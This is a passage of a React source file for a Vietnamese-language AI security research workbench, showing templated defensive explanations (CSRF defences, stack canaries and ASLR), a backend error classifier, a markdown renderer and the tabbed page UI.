  } else if (/csrf|samesite|cookie|token/.test(lower)) {
    topicTitle = "Đối chiếu Cơ chế Phòng vệ SameSite Cookie & Anti-CSRF Token"
    body = `### Góc nhìn Socratic (${providerMeta.label})\n\n#### 1. Sự khác biệt trong Ranh giới Bảo vệ\n- **SameSite=Lax** ngăn trình duyệt đính kèm cookie phiên trong các yêu cầu \`POST/PUT/DELETE\` xuyên trang (cross-site), nhưng vẫn cho phép gửi cookie ở điều hướng top-level \`GET\`.\n- **Anti-CSRF Token (Synchronizer Token Pattern)** yêu cầu giá trị bí mật ngẫu nhiên gắn theo phiên nằm trong HTTP Header tùy chỉnh (\`X-XSRF-TOKEN\`) hoặc thân form — điều mà trang độc hại không thể đọc được nhờ **Same-Origin Policy (SOP)**.\n\n#### 2. Câu hỏi Phản biện\n- *Vì sao nếu hệ thống tồn tại một điểm yếu XSS trên cùng tên miền phụ, cả SameSite Cookie lẫn Anti-CSRF Token đều có thể bị vô hiệu hóa?*`
    findings.push("SameSite hoạt động ở tầng vận chuyển cookie của trình duyệt; CSRF Token kiểm chứng ở tầng ứng dụng")
    findings.push("Chiều sâu phòng thủ (Defense-in-Depth) đòi hỏi kết hợp cả hai cùng kiểm tra Origin/Referer")
    recommendations.push("Cấu hình Cookie với HttpOnly, Secure, SameSite=Lax và bảo vệ Endpoint thay đổi trạng thái bằng X-XSRF-TOKEN")
  } else if (/stack|canary|aslr|buffer|overflow/.test(lower)) {
    topicTitle = "Hiệp đồng Phòng thủ Phần cứng & Trình biên dịch: Stack Canary + ASLR"
    body = `### Góc nhìn Socratic (${providerMeta.label})\n\n#### 1. Cơ chế Phối hợp Lớp\n- **Stack Canary**: Trình biên dịch chèn một giá trị ngẫu nhiên ngay trước Saved Frame Pointer và Return Address. Trước khi hàm thực hiện lệnh \`ret\`, giá trị này được kiểm tra lại; nếu bị tràn bộ đệm ghi đè, tiến trình tự hủy ngay lập tức (\`__stack_chk_fail\`).\n- **ASLR (Address Space Layout Randomization)**: Ngẫu nhiên hóa địa chỉ nền của Stack, Heap và thư viện chia sẻ (libc) mỗi lần nạp tiến trình, ngăn kẻ tấn công đoán trước địa chỉ gadget cho ROP Chain.\n\n#### 2. Câu hỏi Phản biện\n- *Nếu một lỗ hổng Format String cho phép đọc rò rỉ bộ nhớ Stack, cả Stack Canary và ASLR có bị bẻ gãy cùng lúc không?*`
    findings.push("Stack Canary chặn ghi đè tuần tự Return Address trước khi thực thi lệnh ret")
    findings.push("ASLR khiến địa chỉ mục tiêu cho Shellcode/ROP không thể dự đoán tĩnh")
    recommendations.push("Biên dịch nhị phân với đầy đủ PIE, NX/DEP, Full RELRO và Stack Protector")
  } else {
    body = `### Thảo luận Học thuật (${providerMeta.label} · Chế độ Socratic)\n\nĐối với vấn đề: **"${cleanMsg}"**\n\n#### 1. Ba Trụ cột Thẩm định Bảo mật\n1. **Xác định Ranh giới Tin cậy (Trust Boundary)**: Dữ liệu đi vào từ nguồn nào và có thể bị kiểm soát bởi tác nhân bên ngoài ở mức nào?\n2. **Nguyên tắc Đặc quyền Tối thiểu (Least Privilege)**: Nếu thành phần này bị xâm chiếm, phạm vi thiệt hại (Blast Radius) bị giới hạn ở đâu?\n3. **Kiểm chứng Bằng chứng (Empirical Verification)**: Làm thế nào để viết một ca kiểm thử tái hiện (Regression Test) chứng minh bản vá thực sự hiệu quả?\n\n#### 2. Gợi mở Tiếp theo\n- Bạn có thể chuyển sang tab **§01 Kiểm toán Mã nguồn** hoặc **§04 Mô hình hóa Mối đe dọa** để kiểm tra trực tiếp trên mã nguồn/kiến trúc cụ thể.`
    findings.push(`Đã tiếp nhận câu hỏi theo phương pháp Socratic với hồ sơ mô hình ${providerMeta.badgeLabel}`)
    findings.push("Định hướng phân tích theo 3 trục: Ranh giới tin cậy, Đặc quyền tối thiểu và Kiểm chứng thực nghiệm")
    recommendations.push("Cụ thể hóa câu hỏi bằng đoạn mã, giao thức (RFC) hoặc mã lỗi CWE để nhận phân tích sâu hơn")
  }

  return {
    provider: providerMeta.backendValue,
    modelName: `${providerMeta.badgeLabel} (Mẫu Học Thuật)`,
    taskType: "GENERAL_ASSISTANT",
    title: topicTitle,
    analysisResult: body,
    keyFindings: findings,
    recommendations,
    processingTimeMs: Math.max(10, Math.round(performance.now() - start)),
  }
}

// ============================================================================
// TRÌNH PHÂN LOẠI LỖI BACKEND AN TOÀN & BẢN ĐỊA HÓA TIẾNG VIỆT
// ============================================================================
function classifyBackendError(errorMessage) {
  const msg = String(errorMessage || "").toLowerCase()

  if (
    msg.includes("prompt injection") ||
    msg.includes("injection attempt") ||
    msg.includes("security compliance") ||
    msg.includes("rejected") ||
    msg.includes("không có quyền") ||
    msg.includes("access denied")
  ) {
    return {
      kind: "PROMPT_INJECTION",
      title: "Bộ lọc Bảo vệ Prompt Injection đã chặn yêu cầu (400 / 403)",
      detail:
        "Hệ thống phát hiện mẫu chỉ thị vượt rào hoặc cố gắng ghi đè ngữ cảnh hệ thống. Yêu cầu bị từ chối theo chính sách an toàn AI Security Compliance. Vui lòng loại bỏ các chỉ thị can thiệp prompt và thử lại.",
    }
  }

  if (
    msg.includes("quá nhiều yêu cầu") ||
    msg.includes("quota") ||
    msg.includes("rate limit") ||
    msg.includes("tần suất") ||
    msg.includes("429")
  ) {
    return {
      kind: "QUOTA_EXCEEDED",
      title: "Đã chạm giới hạn Tần suất / Quota suy luận AI (429)",
      detail:
        "Tài khoản hiện tại đã sử dụng hết hạn mức truy vấn trong chu kỳ ngắn. Bạn có thể chờ giây lát để gửi lại lên Backend hoặc chạy Phân tích Mẫu Học Thuật cục bộ bên dưới.",
    }
  }

  if (
    msg.includes("hết hạn") ||
    msg.includes("đăng nhập") ||
    msg.includes("không hợp lệ") ||
    msg.includes("401")
  ) {
    return { kind: "AUTH_REQUIRED" }
  }

  if (
    msg.includes("không thể kết nối") ||
    msg.includes("tạm thời không khả dụng") ||
    msg.includes("network") ||
    msg.includes("timeout")
  ) {
    return { kind: "BACKEND_UNAVAILABLE" }
  }

  return {
    kind: "VALIDATION_OR_OTHER",
    title: "Không thể xử lý yêu cầu kiểm toán",
    detail: errorMessage || "Vui lòng kiểm tra lại dữ liệu đầu vào và thử lại.",
  }
}

// ============================================================================
// TRÌNH HIỂN THỊ MARKDOWN HỌC THUẬT AN TOÀN (KHÔNG DÙNG dangerouslySetInnerHTML)
// ============================================================================
function renderInlineSegments(text, keyPrefix) {
  const parts = String(text || "").split(/(\*\*[^*]+\*\*|`[^`]+`)/g)
  return parts.map((part, idx) => {
    if (part.startsWith("**") && part.endsWith("**") && part.length > 4) {
      return (
        <strong key={`${keyPrefix}-b-${idx}`} className="font-semibold text-[#0F172A] dark:text-[#F1F5F9]">
          {part.slice(2, -2)}
        </strong>
      )
    }
    if (part.startsWith("`") && part.endsWith("`") && part.length > 2) {
      return (
        <code
          key={`${keyPrefix}-c-${idx}`}
          className="font-mono-tech text-[12px] px-1.5 py-0.5 rounded bg-[#F3F1EC] dark:bg-[#161C2A] border border-[#E5E2DC] dark:border-white/[0.08] text-[#1D4ED8] dark:text-[#38BDF8]"
        >
          {part.slice(1, -1)}
        </code>
      )
    }
    return <span key={`${keyPrefix}-t-${idx}`}>{part}</span>
  })
}

function StructuredMarkdownBody({ content }) {
  if (!content) return null
  const lines = String(content).split(/\r?\n/)
  const blocks = []
  let i = 0

  while (i < lines.length) {
    const line = lines[i]
    const trimmed = line.trim()

    if (!trimmed) {
      i += 1
      continue
    }

    if (trimmed.startsWith("```")) {
      const lang = trimmed.slice(3).trim()
      const codeLines = []
      i += 1
      while (i < lines.length && !lines[i].trim().startsWith("```")) {
        codeLines.push(lines[i])
        i += 1
      }
      i += 1
      blocks.push({ type: "code", lang, content: codeLines.join("\n") })
      continue
    }

    if (trimmed.startsWith("#### ")) {
      blocks.push({ type: "h4", text: trimmed.slice(5) })
      i += 1
      continue
    }

    if (trimmed.startsWith("### ")) {
      blocks.push({ type: "h3", text: trimmed.slice(4) })
      i += 1
      continue
    }

    if (trimmed.startsWith("> ")) {
      blocks.push({ type: "quote", text: trimmed.slice(2) })
      i += 1
      continue
    }

    if (/^[-*]\s+/.test(trimmed)) {
      const items = []
      while (i < lines.length && /^[-*]\s+/.test(lines[i].trim())) {
        items.push(lines[i].trim().replace(/^[-*]\s+/, ""))
        i += 1
      }
      blocks.push({ type: "ul", items })
      continue
    }

    if (/^\d+\.\s+/.test(trimmed)) {
      const items = []
      while (i < lines.length && /^\d+\.\s+/.test(lines[i].trim())) {
        items.push(lines[i].trim().replace(/^\d+\.\s+/, ""))
        i += 1
      }
      blocks.push({ type: "ol", items })
      continue
    }

    blocks.push({ type: "p", text: trimmed })
    i += 1
  }

  return (
    <div className="space-y-3 text-sm text-[#475569] dark:text-[#94A3B8] leading-relaxed">
      {blocks.map((block, index) => {
        if (block.type === "h3") {
          return (
            <h4
              key={index}
              className="font-serif-editorial text-lg font-medium text-[#0F172A] dark:text-[#F1F5F9] pt-1 border-b border-[#EFEDE7] dark:border-white/[0.06] pb-1.5"
            >
              {renderInlineSegments(block.text, `h3-${index}`)}
            </h4>
          )
        }
        if (block.type === "h4") {
          return (
            <h5
              key={index}
              className="font-sans text-sm font-semibold text-[#0F172A] dark:text-[#F1F5F9] pt-1"
            >
              {renderInlineSegments(block.text, `h4-${index}`)}
            </h5>
          )
        }
        if (block.type === "quote") {
          return (
            <div
              key={index}
              className="pl-3.5 py-2 pr-3 border-l-2 border-[#1D4ED8] dark:border-[#38BDF8] bg-[#FAF9F6] dark:bg-[#161C2A] rounded-r-lg text-xs text-[#475569] dark:text-[#94A3B8]"
            >
              {renderInlineSegments(block.text, `q-${index}`)}
            </div>
          )
        }
        if (block.type === "code") {
          return (
            <div
              key={index}
              className="rounded-lg bg-[#0F172A] dark:bg-[#080B10] border border-[#1E293B] dark:border-white/[0.08] overflow-hidden"
            >
              {block.lang && (
                <div className="px-3 py-1.5 border-b border-white/[0.08] text-[10px] font-mono-tech uppercase tracking-wider text-slate-400">
                  {block.lang}
                </div>
              )}
              <pre className="p-3.5 m-0 text-xs font-mono-tech text-slate-100 overflow-x-auto leading-relaxed">
                <code>{block.content}</code>
              </pre>
            </div>
          )
        }
        if (block.type === "ul") {
          return (
            <ul key={index} className="space-y-1.5 pl-4 list-disc marker:text-[#1D4ED8] dark:marker:text-[#38BDF8]">
              {block.items.map((item, itemIdx) => (
                <li key={itemIdx}>{renderInlineSegments(item, `ul-${index}-${itemIdx}`)}</li>
              ))}
            </ul>
          )
        }
        if (block.type === "ol") {
          return (
            <ol key={index} className="space-y-1.5 pl-5 list-decimal marker:font-mono-tech marker:text-xs marker:text-[#1D4ED8] dark:marker:text-[#38BDF8]">
              {block.items.map((item, itemIdx) => (
                <li key={itemIdx}>{renderInlineSegments(item, `ol-${index}-${itemIdx}`)}</li>
              ))}
            </ol>
          )
        }
        return <p key={index}>{renderInlineSegments(block.text, `p-${index}`)}</p>
      })}
    </div>
  )
}

// ============================================================================
// COMPONENT CHÍNH: SecurityWorkbench
// ============================================================================
export function SecurityWorkbench() {
  const { isAuthenticated } = useAuth()
  const [activeTab, setActiveTab] = useState("audit")

  // Trạng thái đầu vào cho 5 tab
  const [auditLanguage, setAuditLanguage] = useState("java")
  const [auditCode, setAuditCode] = useState(CODE_PRESETS[0].code)
  const [logContent, setLogContent] = useState(LOG_PRESETS[0].content)
  const [cveId, setCveId] = useState("CVE-2021-44228")
  const [threatTopic, setThreatTopic] = useState(THREAT_PRESETS[0])
  const [chatProvider, setChatProvider] = useState("gemini")
  const [chatMessage, setChatMessage] = useState("")
  const [chatHistory, setChatHistory] = useState([])

  // Kết quả AiResponse theo từng tab để chuyển tab không mất kết quả
  const [resultsByTab, setResultsByTab] = useState({})
  const [executionModeByTab, setExecutionModeByTab] = useState({})
  const [guardrailAlert, setGuardrailAlert] = useState(null)
  const [isAnalyzing, setIsAnalyzing] = useState(false)
  const [copiedReport, setCopiedReport] = useState(false)

  const requestSeqRef = useRef(0)

  const currentTabMeta = WORKBENCH_TABS.find((t) => t.id === activeTab) || WORKBENCH_TABS[0]
  const currentResult = resultsByTab[activeTab] || null
  const currentExecutionMode = executionModeByTab[activeTab] || (isAuthenticated ? "idle" : "fallback")

  const computeFallbackForTab = (tabId, overridePayload) => {
    if (tabId === "audit") {
      return buildAuditFallback(overridePayload?.code ?? auditCode, overridePayload?.language ?? auditLanguage)
    }
    if (tabId === "logs") {
      return buildLogFallback(overridePayload?.logs ?? logContent)
    }
    if (tabId === "cve") {
      return buildCveFallback(overridePayload?.cveId ?? cveId)
    }
    if (tabId === "threat") {
      return buildThreatFallback(overridePayload?.topic ?? threatTopic)
    }
    return buildChatFallback(overridePayload?.message ?? chatMessage, overridePayload?.provider ?? chatProvider)
  }

  const recordTabResult = (tabId, aiResponse, mode, userPromptForChat = null) => {
    setResultsByTab((prev) => ({ ...prev, [tabId]: aiResponse }))
    setExecutionModeByTab((prev) => ({ ...prev, [tabId]: mode }))
    if (tabId === "chat" && userPromptForChat) {
      setChatHistory((prev) => [
        ...prev,
        {
          id: `${Date.now()}-${prev.length}`,
          question: userPromptForChat,
          provider: chatProvider,
          response: aiResponse,
          mode,
        },
      ])
    }
  }

  const runAnalysis = async (tabOverride = activeTab, payloadOverride = null) => {
    const targetTab = tabOverride
    const seq = ++requestSeqRef.current
    setGuardrailAlert(null)

    const effectiveAuditCode = payloadOverride?.code ?? auditCode
    const effectiveAuditLang = payloadOverride?.language ?? auditLanguage
    const effectiveLogs = payloadOverride?.logs ?? logContent
    const effectiveCve = (payloadOverride?.cveId ?? cveId).trim()
    const effectiveThreat = (payloadOverride?.topic ?? threatTopic).trim()
    const effectiveChatMsg = (payloadOverride?.message ?? chatMessage).trim()
    const effectiveProviderKey = payloadOverride?.provider ?? chatProvider
    const mappedProvider =
      CHAT_PROVIDERS.find((p) => p.id === effectiveProviderKey)?.backendValue || "GEMINI_3_8_HIGH"

    // Kiểm tra đầu vào rỗng
    if (targetTab === "audit" && !effectiveAuditCode.trim()) {
      setGuardrailAlert({
        kind: "VALIDATION_OR_OTHER",
        title: "Chưa có mã nguồn để kiểm toán",
        detail: "Vui lòng dán đoạn mã cần phân tích hoặc chọn một mẫu lỗ hổng bên trên.",
      })
      return
    }
    if (targetTab === "logs" && !effectiveLogs.trim()) {
      setGuardrailAlert({
        kind: "VALIDATION_OR_OTHER",
        title: "Chưa có nội dung nhật ký",
        detail: "Vui lòng dán nhật ký HTTP / Sysmon hoặc chọn một mẫu nhật ký tấn công.",
      })
      return
    }
    if (targetTab === "cve" && !effectiveCve) {
      setGuardrailAlert({
        kind: "VALIDATION_OR_OTHER",
        title: "Chưa nhập mã CVE",
        detail: "Vui lòng nhập mã định danh CVE hợp lệ (ví dụ: CVE-2021-44228).",
      })
      return
    }
    if (targetTab === "threat" && !effectiveThreat) {
      setGuardrailAlert({
        kind: "VALIDATION_OR_OTHER",
        title: "Chưa nhập chủ đề kiến trúc",
        detail: "Vui lòng mô tả hệ thống hoặc chọn một kịch bản kiến trúc mẫu.",
      })
      return
    }
    if (targetTab === "chat" && !effectiveChatMsg) {
      setGuardrailAlert({
        kind: "VALIDATION_OR_OTHER",
        title: "Chưa nhập câu hỏi Socratic",
        detail: "Hãy đặt một câu hỏi nghiên cứu về cơ chế lỗ hổng, giao thức hoặc kiến trúc phòng thủ.",
      })
      return
    }

    // Chưa đăng nhập: Chạy Smart Academic Fallback trực tiếp (tránh kích hoạt 401 session expired)
    if (!isAuthenticated) {
      setIsAnalyzing(true)
      window.setTimeout(() => {
        if (requestSeqRef.current !== seq) return
        const fallbackRes = computeFallbackForTab(targetTab, payloadOverride)
        recordTabResult(
          targetTab,
          fallbackRes,
          "fallback",
          targetTab === "chat" ? effectiveChatMsg : null
        )
        if (targetTab === "chat") {
          setChatMessage("")
        }
        setIsAnalyzing(false)
      }, 160)
      return
    }

    // Đã đăng nhập: Gọi API Backend AiSecurityController
    setIsAnalyzing(true)
    try {
      let apiResult
      if (targetTab === "audit") {
        apiResult = await aiService.auditCode(effectiveAuditCode, effectiveAuditLang)
      } else if (targetTab === "logs") {
        apiResult = await aiService.analyzeLogs(effectiveLogs)
      } else if (targetTab === "cve") {
        apiResult = await aiService.analyzeCve(effectiveCve)
      } else if (targetTab === "threat") {
        apiResult = await aiService.generateThreatScenario(effectiveThreat)
      } else {
        apiResult = await aiService.chat(effectiveChatMsg, mappedProvider)
      }

      if (requestSeqRef.current !== seq) return

      if (apiResult?.success && apiResult.data) {
        recordTabResult(
          targetTab,
          apiResult.data,
          "live",
          targetTab === "chat" ? effectiveChatMsg : null
        )
        if (targetTab === "chat") {
          setChatMessage("")
        }
      } else {
        const classified = classifyBackendError(apiResult?.error)
        if (classified.kind === "PROMPT_INJECTION") {
          setGuardrailAlert(classified)
        } else if (classified.kind === "QUOTA_EXCEEDED") {
          setGuardrailAlert({
            ...classified,
            allowLocalFallback: true,
            pendingTab: targetTab,
            pendingPayload: payloadOverride,
            pendingChatMsg: targetTab === "chat" ? effectiveChatMsg : null,
          })
        } else if (classified.kind === "AUTH_REQUIRED" || classified.kind === "BACKEND_UNAVAILABLE") {
          const fallbackRes = computeFallbackForTab(targetTab, payloadOverride)
          recordTabResult(
            targetTab,
            fallbackRes,
            "fallback",
            targetTab === "chat" ? effectiveChatMsg : null
          )
          if (targetTab === "chat") {
            setChatMessage("")
          }
        } else {
          setGuardrailAlert(classified)
        }
      }
    } finally {
      if (requestSeqRef.current === seq) {
        setIsAnalyzing(false)
      }
    }
  }

  const handleCopyReport = async () => {
    if (!currentResult) return
    const text = [
      `# ${currentResult.title}`,
      `Provider: ${currentResult.provider} | Model: ${currentResult.modelName} | Latency: ${currentResult.processingTimeMs} ms`,
      "",
      "## Phát hiện Trọng tâm (Key Findings)",
      ...(currentResult.keyFindings || []).map((f) => `- ${f}`),
      "",
      currentResult.analysisResult || "",
      "",
      "## Khuyến nghị Khắc phục (Recommendations)",
      ...(currentResult.recommendations || []).map((r) => `- ${r}`),
    ].join("\n")

    try {
      await navigator.clipboard.writeText(text)
      setCopiedReport(true)
      window.setTimeout(() => setCopiedReport(false), 1800)
    } catch {
      // Bỏ qua nếu môi trường không cho phép clipboard
    }
  }

  const lineCount = auditCode ? auditCode.split(/\r?\n/).length : 0
  const showFallbackBanner = !isAuthenticated || currentExecutionMode === "fallback"

  return (
    <div className="w-full bg-[#FAF9F6] dark:bg-[#0B0E14] text-[#0F172A] dark:text-[#F1F5F9] transition-colors duration-200 py-10 sm:py-14">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 space-y-7">
        {/* ====================================================================
            TIÊU ĐỀ BÀN NGHIÊN CỨU HỌC THUẬT
           ==================================================================== */}
        <header className="flex flex-col lg:flex-row lg:items-end justify-between gap-6 pb-6 border-b border-[#E5E2DC] dark:border-white/[0.08]">
          <div className="space-y-3 max-w-3xl">
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-md bg-[#F3F1EC] dark:bg-[#161C2A] border border-[#E5E2DC] dark:border-white/[0.08] font-mono-tech text-[11px] uppercase tracking-[0.12em] text-[#1D4ED8] dark:text-[#38BDF8]">
              <Cpu className="h-3.5 w-3.5" strokeWidth={1.75} />
              <span>TRẠM NGHIÊN CỨU AI BẢO MẬT // v2</span>
            </div>

            <h1 className="font-serif-editorial text-3xl sm:text-4xl lg:text-[2.65rem] font-medium tracking-[-0.02em] leading-[1.12] text-[#0F172A] dark:text-[#F1F5F9]">
              Bàn Nghiên Cứu &amp; Kiểm Toán Bảo Mật AI
            </h1>

            <p className="font-sans text-sm sm:text-base text-[#475569] dark:text-[#94A3B8] leading-relaxed">
              Không gian thực nghiệm đa mô hình tích hợp bộ định tuyến AI Security Router: kiểm toán mã nguồn tĩnh, truy vết nhật ký SOC, tình báo CVE, mô hình hóa STRIDE/ATT&amp;CK và đối thoại Socratic.
            </p>
          </div>

          <div className="flex flex-wrap items-center gap-2.5 shrink-0">
            <div
              className={`inline-flex items-center gap-2 px-3 py-1.5 rounded-lg border font-mono-tech text-xs ${
                isAuthenticated
                  ? "bg-emerald-50 dark:bg-emerald-500/12 border-emerald-200 dark:border-emerald-500/25 text-emerald-700 dark:text-emerald-300"
                  : "bg-[#F3F1EC] dark:bg-[#161C2A] border-[#E5E2DC] dark:border-white/[0.08] text-[#475569] dark:text-[#94A3B8]"
              }`}
            >
              <span
                className={`h-2 w-2 rounded-full ${
                  isAuthenticated ? "bg-emerald-500" : "bg-amber-500"
                }`}
              />
              <span>
                {isAuthenticated
                  ? "Phiên đã xác thực · Backend Live AI"
                  : "Chế độ Khách · Phân tích Mẫu"}
              </span>
            </div>

            <Link
              to="/labs"
              className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-white dark:bg-[#121722] border border-[#E5E2DC] dark:border-white/[0.08] hover:border-[#1D4ED8] dark:hover:border-[#3B82F6] text-xs font-medium text-[#0F172A] dark:text-[#F1F5F9] transition-colors"
            >
              <Terminal className="h-3.5 w-3.5 text-[#1D4ED8] dark:text-[#38BDF8]" />
              <span>Phòng Lab Sandbox</span>
            </Link>
          </div>
        </header>

        {/* ====================================================================
            BIỂU NGỮ HỌC THUẬT (GUEST / FALLBACK) HOẶC CẢNH BÁO GUARDRAIL
           ==================================================================== */}
        {showFallbackBanner && (
          <div className="rounded-xl bg-[#F3F1EC] dark:bg-[#161C2A] border border-[#E5E2DC] dark:border-white/[0.08] px-4 py-3.5 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
            <div className="flex items-start sm:items-center gap-3">
              <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-lg bg-white dark:bg-[#121722] border border-[#E5E2DC] dark:border-white/[0.08] text-[#1D4ED8] dark:text-[#38BDF8]">
                <BookOpen className="h-4 w-4" strokeWidth={1.75} />
              </div>
              <div className="space-y-0.5">
                <p className="text-xs sm:text-sm font-medium text-[#0F172A] dark:text-[#F1F5F9]">
                  Chế độ Phân Tích Mẫu Học Thuật — Đăng nhập để chạy suy luận AI Backend trực tiếp
                </p>
                <p className="text-xs text-[#475569] dark:text-[#94A3B8]">
                  Hệ thống tự động sử dụng bộ phân tích heuristic chuẩn hóa (SQLi, XSS, SSRF/IMDS, Log4Shell, STRIDE) khi chưa đăng nhập hoặc máy chủ AI tạm gián đoạn.
                </p>
              </div>
            </div>

            {!isAuthenticated && (
              <Link
                to="/login"
                className="inline-flex items-center justify-center gap-1.5 px-3.5 py-2 rounded-lg bg-[#1D4ED8] hover:bg-[#1E40AF] dark:bg-[#3B82F6] dark:hover:bg-[#2563EB] text-white text-xs font-semibold whitespace-nowrap shrink-0 transition-colors"
              >
                <LogIn className="h-3.5 w-3.5" />
                <span>Đăng nhập ngay</span>
              </Link>
            )}
          </div>
        )}

        {guardrailAlert && (
          <div
            role="alert"
            className={`rounded-xl border px-4 py-3.5 flex flex-col sm:flex-row sm:items-center justify-between gap-3 ${
              guardrailAlert.kind === "PROMPT_INJECTION"
                ? "bg-rose-50 dark:bg-rose-500/12 border-rose-200 dark:border-rose-500/30 text-rose-900 dark:text-rose-200"
                : "bg-amber-50 dark:bg-amber-500/12 border-amber-200 dark:border-amber-500/30 text-amber-900 dark:text-amber-200"
            }`}
          >
            <div className="flex items-start gap-3">
              {guardrailAlert.kind === "PROMPT_INJECTION" ? (
                <ShieldAlert className="h-5 w-5 text-rose-600 dark:text-rose-400 shrink-0 mt-0.5" />
              ) : (
                <AlertTriangle className="h-5 w-5 text-amber-600 dark:text-amber-400 shrink-0 mt-0.5" />
              )}
              <div className="space-y-1">
                <p className="text-xs sm:text-sm font-semibold">{guardrailAlert.title}</p>
                <p className="text-xs opacity-90 leading-relaxed">{guardrailAlert.detail}</p>
              </div>
            </div>

            {guardrailAlert.allowLocalFallback && (
              <button
                type="button"
                onClick={() => {
                  const tabId = guardrailAlert.pendingTab || activeTab
                  const fallbackRes = computeFallbackForTab(tabId, guardrailAlert.pendingPayload)
                  recordTabResult(tabId, fallbackRes, "fallback", guardrailAlert.pendingChatMsg)
                  setGuardrailAlert(null)
                }}
                className="px-3.5 py-2 rounded-lg bg-white dark:bg-[#121722] border border-amber-300 dark:border-amber-500/40 text-xs font-semibold text-amber-900 dark:text-amber-200 hover:bg-amber-100/70 dark:hover:bg-[#161C2A] whitespace-nowrap shrink-0 cursor-pointer transition-colors"
              >
                Chạy Phân tích Mẫu Cục bộ
              </button>
            )}
          </div>
        )}

        {/* ====================================================================
            THANH CHỌN 5 CHUYÊN ĐỀ NGHIÊN CỨU
           ==================================================================== */}
        <nav
          aria-label="Chuyên đề nghiên cứu AI"
          role="tablist"
          className="flex items-center gap-2 overflow-x-auto pb-1"
        >
          {WORKBENCH_TABS.map((tab) => {
            const Icon = tab.icon
            const isActive = activeTab === tab.id
            return (
              <button
                key={tab.id}
                type="button"
                role="tab"
                aria-selected={isActive}
                onClick={() => {
                  setActiveTab(tab.id)
                  setGuardrailAlert(null)
                }}
                className={`inline-flex items-center gap-2 px-3.5 py-2.5 rounded-xl border text-xs sm:text-[13px] font-medium whitespace-nowrap shrink-0 transition-colors cursor-pointer ${
                  isActive
                    ? "bg-[#1D4ED8] dark:bg-[#2563EB] text-white border-[#1D4ED8] dark:border-[#3B82F6] font-semibold"
                    : "bg-white dark:bg-[#121722] text-[#475569] dark:text-[#94A3B8] border-[#E5E2DC] dark:border-white/[0.08] hover:text-[#0F172A] dark:hover:text-[#F1F5F9] hover:bg-[#F3F1EC] dark:hover:bg-[#161C2A]"
                }`}
              >
                <span
                  className={`font-mono-tech text-[10px] ${
                    isActive ? "text-blue-100" : "text-[#64748B] dark:text-[#64748B]"
                  }`}
                >
                  {tab.code}
                </span>
                <Icon className="h-3.5 w-3.5 shrink-0" strokeWidth={1.75} />
                <span>{tab.label}</span>
              </button>
            )
          })}
        </nav>

        {/* ====================================================================
            KHUNG LÀM VIỆC BẤT ĐỐI XỨNG 12 CỘT (INPUT & OUTPUT VIEWER)
           ==================================================================== */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
          {/* CỘT TRÁI: VÙNG NHẬP LIỆU & MẪU NGHIÊN CỨU */}
          <section className="lg:col-span-6 rounded-xl bg-white dark:bg-[#121722] border border-[#E5E2DC] dark:border-white/[0.08] p-5 sm:p-6 space-y-5">
            <div className="space-y-1.5 border-b border-[#EFEDE7] dark:border-white/[0.06] pb-4">
              <div className="font-mono-tech text-[11px] uppercase tracking-[0.12em] text-[#1D4ED8] dark:text-[#38BDF8]">
                {currentTabMeta.code} // ĐẦU VÀO THỰC NGHIỆM
              </div>
              <h2 className="font-serif-editorial text-xl sm:text-2xl font-medium text-[#0F172A] dark:text-[#F1F5F9]">
                {currentTabMeta.label}
              </h2>
              <p className="text-xs sm:text-sm text-[#475569] dark:text-[#94A3B8]">
                {currentTabMeta.subtitle}
              </p>
            </div>

            {/* TAB 1: KIỂM TOÁN MÃ NGUỒN */}
            {activeTab === "audit" && (
              <div className="space-y-4">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                  <label
                    htmlFor="workbench-audit-language"
                    className="font-mono-tech text-[11px] uppercase tracking-wider text-[#475569] dark:text-[#94A3B8]"
                  >
                    Ngôn ngữ đích (Target Language)
                  </label>
                  <select
                    id="workbench-audit-language"
                    name="auditLanguage"
                    value={auditLanguage}
                    onChange={(e) => setAuditLanguage(e.target.value)}
                    className="sm:w-64 rounded-lg border border-[#E5E2DC] dark:border-white/[0.12] bg-[#FAF9F6] dark:bg-[#161C2A] px-3 py-2 text-xs font-medium text-[#0F172A] dark:text-[#F1F5F9] focus:outline-none focus:border-[#1D4ED8] dark:focus:border-[#3B82F6]"
                  >
                    {AUDIT_LANGUAGES.map((lang) => (
                      <option key={lang.value} value={lang.value}>
                        {lang.label}
                      </option>
                    ))}
                  </select>
                </div>

                <div className="space-y-2">
                  <span className="block font-mono-tech text-[10px] uppercase tracking-wider text-[#64748B] dark:text-[#94A3B8]">
                    Mẫu mã nguồn chứa lỗ hổng điển hình:
                  </span>
                  <div className="flex flex-wrap gap-1.5">
                    {CODE_PRESETS.map((preset) => (
                      <button
                        key={preset.id}
                        type="button"
                        onClick={() => {
                          setAuditLanguage(preset.language)
                          setAuditCode(preset.code)
                          setGuardrailAlert(null)
                        }}
                        className="px-2.5 py-1 rounded-md border border-[#E5E2DC] dark:border-white/[0.08] bg-[#FAF9F6] dark:bg-[#161C2A] hover:border-[#1D4ED8] dark:hover:border-[#3B82F6] text-[11px] font-mono-tech text-[#0F172A] dark:text-[#F1F5F9] transition-colors cursor-pointer"
                      >
                        {preset.label}
                      </button>
                    ))}
                  </div>
                </div>

                <div className="space-y-1.5">
                  <div className="flex items-center justify-between">
                    <label
                      htmlFor="workbench-audit-code"
                      className="font-mono-tech text-[11px] uppercase tracking-wider text-[#475569] dark:text-[#94A3B8]"
                    >
                      Mã nguồn kiểm toán
                    </label>
                    <span className="font-mono-tech text-[11px] text-[#64748B] dark:text-[#94A3B8]">
                      {lineCount} dòng · {auditCode.length} ký tự
                    </span>
                  </div>
                  <textarea
                    id="workbench-audit-code"
                    name="auditSourceCode"
                    rows={10}
                    value={auditCode}
                    onChange={(e) => setAuditCode(e.target.value)}
                    onKeyDown={(e) => {
                      if ((e.ctrlKey || e.metaKey) && e.key === "Enter") {
                        e.preventDefault()
                        runAnalysis("audit")
                      }
                    }}
                    placeholder="Dán đoạn mã nguồn Java, JavaScript, Python, SQL hoặc C cần phân tích lỗ hổng..."
